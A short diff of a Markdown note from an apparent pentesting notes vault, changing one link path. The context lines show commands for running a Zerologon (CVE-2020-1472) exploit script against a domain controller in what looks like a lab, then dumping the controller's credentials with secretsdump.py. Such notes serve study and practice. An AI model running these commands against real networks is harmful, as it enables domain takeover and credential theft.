@@ -15,7 +15,7 @@ python cve-2020-1472.py <dc hostname> <dc ip>
 python cve-2020-1472.py HYDRA-DC 10.0.2.16
 ```
 #### Verify exploit
-verify that the exploit ran successfully by dumping dc SAM using [[Dark Arts I/Active Directory/Post Breach/Tools/Attacks/secretsdump|secretsdump]]
+verify that the exploit ran successfully by dumping dc SAM using [[Dark Arts/Active Directory/Post Breach/Tools/Attacks/secretsdump|secretsdump]]
 ```bash
 # It will still ask for a password, just hit enter and leave it empty
 secretsdump.py -just-dc <domain>/<dc hostname>\$@<dc ip>
